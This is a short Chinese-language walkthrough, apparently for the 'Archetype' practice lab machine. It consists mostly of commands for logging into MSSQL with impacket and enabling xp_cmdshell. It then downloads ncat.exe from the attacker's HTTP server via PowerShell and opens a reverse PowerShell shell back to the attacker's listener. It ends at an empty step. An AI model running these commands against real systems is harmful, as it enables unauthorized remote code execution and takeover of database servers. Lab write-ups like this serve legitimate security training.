  • Archetype 講解

python3 -m venv ./extest
cd extest
. ./bin/activate
pip install impacket
python3 mssqlclient.py ARCHETYPE/sql_svc@{TARGET_IP} -windows-auth
進入mssql後
1. 檢查權限
   select is_srvrolemember('sysadmin'); #回應1則為sa權限
   exec xp_cmdshell "whoami"; #回應ERROR表示不可執行xp_cmdshell , NULL表示可執行xp_cmdshell
2. 修改xp_cmdshell為啟用
   1. 方法1
      enable_xp_cmdshell
   2. 方法2
      EXEC sp_configure 'show advanced options', 1
      RECONFIGURE
      EXEC sp_configure 'xp_cmdshell',1
      RECONFIGURE
3. 準備好nc.exe
4. 上傳nc.exe
   4.1 cd extest
   4.2 cp xxdir/ncat.exe ./
   4.3 python3 -m http.server 803 #當下目錄即為http server的根目錄，http://[yourTunIp]:803/ncat.exe
   4.4 exec xp_cmdshell "powershell -c pwd"; #確認所在目錄位置，system32無法直接寫入檔案，所以要cd到其他目錄
   4.5 exec xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads;wget http://[yourTunIp]:803/ncat.exe -o .\nc.exe";
   4.6 sudo ncat -lvp 2333 #在PC端建立 listen port
   4.7 exec xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads;.\nc.exe -e powershell.exe [yourTunIp] 2333";
   4.8
